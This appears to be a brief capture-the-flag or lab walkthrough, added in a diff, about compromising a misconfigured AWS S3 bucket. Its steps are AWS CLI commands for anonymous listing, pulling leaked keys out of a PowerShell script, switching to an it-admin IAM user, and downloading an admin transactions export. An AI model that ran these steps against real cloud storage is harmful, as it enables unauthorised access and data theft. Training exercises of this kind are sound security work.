@@ -1,0 +1,57 @@
+Connect with VPN and open the link 
+http://dev.huge-logistics.com/
+View page sources 
+
+Here its dev.huge-logistics.com
+Open link 
+https://s3.amazonaws.com/dev.huge-logistics.com/
+Access denied 
+
+Open terminal and configure 
+sudo apt install awscli
+aws s3 ls s3://dev.huge-logistics.com --no-sign-request
+aws s3 ls s3://dev.huge-logistics.com --no-sign-request --recursive 
+access deniedd
+
+aws s3 ls s3://dev.huge-logistics.com/shared/ --no-sign-request
+aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
+unzip hl_migration_project.zip -d h1_migration_project
+cd h1_migration_project 
+
+ls
+cat migrate_secrets.ps1
+Got access key and secret key 
+aws configure
+(use getting access key and secret key)
+aws sts get-caller-identity
+aws s3 ls s3://dev.huge-logistics.com/admin/
+aws s3 ls s3://dev.huge-logistics.com/migration-files/
+aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml .
+
+cat test-export.xml 
+Use aws configure to set the new keys. Running aws sts get-caller-identity this time reveals that we are the IAM user it-admin 
+aws s3 cp s3://dev.huge-logistics.com/admin/website_transactions_export.csv .
+
+aws s3api get-bucket-policy --bucket dev.huge-logistics.com | jq -r '.Policy | fromjson'
+
+Check this 
+{
+            "Sid": "ListBucketRootAndShared",
+            "Effect": "Allow",
+            "Principal": "*",
+            "Action": "s3:ListBucket",
+            "Resource": "arn:aws:s3:::dev.huge-logistics.com",
+            "Condition": {
+                "StringEquals": {
+                    "s3:prefix": [
+                        "",
+                        "shared/",
+                        "static/"
+                    ],
+                    "s3:delimiter": "/"
+                }
+            }
+        },
+
+https://dev.huge-logistics.com.s3.amazonaws.com/?prefix=&delimiter=/
+
